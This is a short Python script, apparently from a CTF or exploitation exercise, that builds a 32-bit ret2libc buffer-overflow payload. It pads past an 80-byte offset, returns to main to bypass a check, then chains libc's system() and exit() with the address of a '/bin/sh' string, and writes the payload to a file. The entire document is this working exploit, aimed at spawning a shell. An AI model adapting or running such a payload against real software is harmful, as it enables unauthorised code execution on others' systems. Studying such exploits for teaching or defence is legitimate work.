import struct

# Assume these values are found through your analysis
offset = 76 + 4	# buff len + offset
libc_base_addr = 0xb7e2c000
exit_offset = 0x32be0
system_offset = 0x0003f060 
bin_sh_offset = 0x160c58
main_ret_offset = 0x0804854b

# Create the payload
payload = b"A" * offset
payload += struct.pack("<I", main_ret_offset)     #return to main to bypasss check, then return to libc
payload += struct.pack("<I", libc_base_addr + system_offset)
payload += struct.pack("<I", libc_base_addr + exit_offset)
payload += struct.pack("<I", libc_base_addr + bin_sh_offset)


# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)
